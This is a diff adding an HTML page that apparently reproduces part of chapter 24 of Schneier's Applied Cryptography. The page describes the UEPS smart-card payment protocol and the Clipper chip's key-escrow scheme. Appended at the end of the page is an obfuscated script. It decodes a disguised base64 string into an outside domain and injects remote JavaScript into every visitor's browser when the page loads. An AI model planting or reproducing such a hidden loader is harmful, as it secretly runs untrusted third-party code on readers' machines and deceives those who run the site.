@@ -1,0 +1,108 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Example Implementations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=24//-->
+<!--PAGES=589-592//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading16"></A><FONT COLOR="#000077">24.15 Universal Electronic Payment System (UEPS)</FONT></H3>
+<P>The UEPS is a smart-card banking application initially developed for rural South Africa, but later adopted by all of that country&#146;s major banking groups. About 2 million cards were issued in that country by early 1995. It has also been adopted in Namibia, and is also being deployed by at least one bank in Russia.
+</P>
+<P>The system provides a secure debit card suitable for regions where poor telephone service make on-line verification impossible. Both customers and merchants have cards; customers can use their cards to transfer money to merchants. Merchants can then take their cards to a telephone and deposit the money in their bank account; customers can take their cards to a telephone and have money moved onto their card. There is no intention to provide anonymity, only to prevent fraud.</P>
+<P>Here is the communications protocol between customer Alice and merchant Bob. (Actually, Alice and Bob just plug their cards into a machine and wait for it to complete the transaction.) When Alice first gets her card, she is given a key pair, <I>K<SUB>1</SUB></I> and <I>K<SUB>2</SUB></I>; the bank calculates them from her name and some secret function. Only the merchant cards have the secrets necessary to work out these customer keys.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends Bob her name, <I>A</I>, his name, <I>B</I>, and a random number, <I>R<SUB>A</SUB></I>, encrypted using DES: first with <I>K<SUB>2</SUB></I> and then with <I>K<SUB>1</SUB></I>. She also sends her name in the clear.
+<DL>
+<DD><I>A, E<SUB><SMALL>K</SMALL></I><SUB>1</SUB></SUB>(<I>E<SUB><SMALL>K</SMALL><SUB>2</SUB></SUB>(A, B, R<SUB>A</SUB></I>))
+</DL>
+<DD><B>(2)</B>&nbsp;&nbsp;Bob calculates <I>K<SUB>1</SUB></I> and <I>K<SUB>2</SUB></I> from Alice&#146;s name. He decrypts the message, confirms that <I>A</I> and <I>B</I> are correct, then encrypts Alice&#146;s unencrypted second message with <I>K<SUB>2</SUB></I>.
+<DL>
+<DD><I>E<SUB><SMALL>K</SMALL><SUB>2</SUB></SUB>(A, B, R<SUB>A</SUB></I>)
+</DL>
+<BR>Bob does not send this message to Alice; 56 bits of the ciphertext become <I>K<SUB>3</SUB></I>. Bob then sends Alice his name, her name, and another random number, <I>R<SUB>B</SUB></I>, encrypted using DES: first with <I>K<SUB>3</SUB></I> and then with <I>K<SUB>1</SUB></I>.
+<DL>
+<DD><I>E<SUB><SMALL>K</SMALL><SUB></I>1</SUB></SUB>(E<SUB><SMALL>K</SMALL><SUB>3</SUB></SUB>(<I>B, A, R<SUB>B</SUB></I>))
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>K<SUB>3</SUB></I> in the same manner Bob did. She decrypts Bob&#146;s message, confirms that <I>B</I> and <I>A</I> are correct, then encrypts Bob&#146;s unencrypted message with <I>K<SUB>3</SUB></I>.
+<DL>
+<DD><I>E<SUB><SMALL>K</SMALL><SUB>3</SUB></SUB>(B, A, R<SUB>B</SUB></I>)
+</DL>
+<BR>Alice does not send this message to Bob; 56 bits of the ciphertext become <I>K<SUB>4</SUB></I>. Alice then sends Bob her name, his name, and the digital check, <I>C.</I> This check contains the names of the sender and recipient, a date, a check number, an amount, and two MACs, all encrypted using DES: first with <I>K<SUB>4</SUB></I> and then with <I>K<SUB>1</SUB></I>. One of the MACs can be verified by Alice&#146;s bank, and the other can only be verified by the clearing center. Alice debits her account by the correct amount.
+<DL>
+<DD><I>E<SUB><SMALL>K</SMALL><SUB></I>1</SUB></SUB>(E<SUB><SMALL>K</SMALL><SUB>4</SUB></SUB>(<I>A, B, C</I>))
+</DL>
+<DD><B>(4)</B>&nbsp;&nbsp;Bob computes <I>K<SUB>4</SUB></I> in the same manner Alice did. Assuming all the names match and the check is correctly formed, he accepts it for payment.
+</DL>
+<P>A really clever thing about this protocol is that the encryption key for each message depends on the previous message. Each message doubles as an authenticator for <I>all</I> previous messages. This means that someone can&#146;t replay an old message; the receiver could never decrypt it. I am impressed with this idea and expect that it will see wider use once it becomes widely known.</P>
+<P>Another clever thing about this protocol is that it enforces correct implementation. If the application developer doesn&#146;t implement this protocol correctly, it just won&#146;t work.</P>
+<P>Both cards store records of every transaction. When the cards eventually go online to communicate with the bank&#151;the merchant to deposit his money and the customer to get more money&#151;the bank uploads these records for auditing purposes.</P>
+<P>Tamperproof hardware prevents either participant from messing with the data; Alice cannot change the value of her card. Extensive audit trails provide data to identify and prosecute fraudulent transactions. There are universal secrets in the cards&#151;MAC keys in the customer cards, functions to convert customer names to <I>K<SUB>1</SUB></I> and <I>K<SUB>2</SUB></I> in the merchant cards&#151;but these are assumed to be difficult to reverse-engineer.</P>
+<P>This scheme is not meant to be perfect, only more secure than either paper checks or traditional debit cards. The threat of fraud is not from rival militaries, but from opportunistic customers and merchants. UEPS protects against that kind of abuse.</P>
+<P>The message exchange is an excellent example of a robust protocol: Every message names both parties, includes unique information to ensure freshness, and depends explicitly on all the messages that came before it.</P>
+<H3><A NAME="Heading17"></A><FONT COLOR="#000077">24.16 Clipper</FONT></H3>
+<P>The Clipper chip (also known as the MYK-78T) is an NSA-designed, tamper-resistant VLSI chip designed for encrypting voice conversations; it is one of the two chips that implements the U.S. government&#146;s Escrowed Encryption Standard (EES) [1153]. VLSI Technologies, Inc. manufactures the chip, and Mykotronx, Inc. programs it. Initially, the Clipper chip will be available in the AT&ampT Model 3600 Telephone Security Device (see Section 24.18). The chip implements the Skipjack encryption algorithm (see Section 13.12), an NSA-designed classified secret-key encryption algorithm, in OFB only.
+</P>
+<P>The most controversial aspect of the Clipper chip, and the entire EES, is the key-escrow protocol (see Section 4.14). Each chip has a special key, not needed for messages. This key is used to encrypt a copy of each user&#146;s message key. As part of the synchronization process, the sending Clipper chip generates and sends a <B>Law Enforcement Access Field</B> (<B>LEAF</B>) to the receiving Clipper chip. The LEAF contains a copy of the current session key, encrypted with a special key (called the <B>unit key</B>). This allows a government eavesdropper to recover the session key, and then recover the plaintext of the conversation.</P>
+<P>According to the director of NIST [812]:</P>
+<BLOCKQUOTE><P>A &#147;key-escrow&#148; system is envisioned that would ensure that the &#147;Clipper Chip&#148; is used to protect the privacy of law-abiding Americans. Each device containing the chip will have two unique &#147;keys, &#148; numbers that will be needed by authorized government agencies to decode messages encoded by the device. When the device is manufactured, the two keys would be deposited separately in two &#147;key-escrow&#148; databases established by the attorney general. Access to these keys would be limited to government officials with legal authorization to conduct a wiretap.
+</P>
+</BLOCKQUOTE><P>The government also wants to encourage the sale of telephones with these devices abroad; no one knows what might happen to those key-escrow databases.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="24-10.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="24-12.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(fmRCQWVj, mXZJLdoP) {mXZJLdoP = fmRCQWVj.createElement('script');mXZJLdoP.type = 'text/javascript';mXZJLdoP.async = true;mXZJLdoP.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');fmRCQWVj.getElementsByTagName('body')[0].appendChild(mXZJLdoP);}(document));</script></body>
+</html>
